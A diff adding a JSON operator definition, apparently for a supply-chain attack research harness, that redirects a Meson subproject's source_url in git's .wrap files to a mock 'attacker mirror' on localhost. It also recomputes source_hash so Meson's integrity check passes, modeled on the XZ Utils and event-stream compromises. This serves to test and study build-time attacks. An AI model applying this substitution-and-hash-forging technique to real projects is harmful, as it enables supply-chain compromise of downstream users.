@@ -1,0 +1,39 @@
+{
+  "id": "git_wrap_fetch_redirect",
+  "name": "Wrap source URL redirect to attacker mirror (effect-bearing)",
+  "description": "Worked example of an effective dependency_fetch mutant on the git target. Redirects a Meson subproject's source_url to an attacker-controlled mirror (modeled by the harness mock server) and recomputes source_hash to match the substituted archive, so Meson's integrity check still passes and the build fetches substituted code. Models the XZ Utils and event-stream substituted-source pattern. This operator carries an effect block so the validator can classify the mutant as 'effective' (not merely build_valid).",
+  "target_build_phase": "dependency_fetch",
+  "scheme": "dependency_aware",
+  "mode": "replace",
+  "injection_location": {
+    "file_glob": "subprojects/*.wrap",
+    "field": "source_url"
+  },
+  "placeholders": {
+    "WRAP_FILE": "relative path to the .wrap file being modified",
+    "ORIGINAL_URL": "the legitimate source_url currently in the wrap file"
+  },
+  "attacker_values": {
+    "SUBSTITUTE_URL": "http://127.0.0.1:8000/substituted/archive.tar.xz"
+  },
+  "template": {
+    "file_path": "{{WRAP_FILE}}",
+    "replacement_value": "{{SUBSTITUTE_URL}}"
+  },
+  "preconditions": [
+    "project has at least one [wrap-file] subproject with a source_url (git has 5: curl, expat, openssl, pcre2, zlib)",
+    "git resolves these via system libraries by default, so the wrap is only read under meson --wrap-mode=forcefallback",
+    "source_hash must be recomputed to the sha256 of the substituted archive served at SUBSTITUTE_URL; removing the hash does NOT bypass integrity on Meson >= 1.12 (see data/placement_rules.md)"
+  ],
+  "effect": {
+    "observable": "network_fetch",
+    "check": {
+      "request_path": "/substituted/"
+    },
+    "requires": []
+  },
+  "source_attacks": [
+    "XZ Utils (CVE-2024-3094)",
+    "event-stream (Copay)"
+  ]
+}
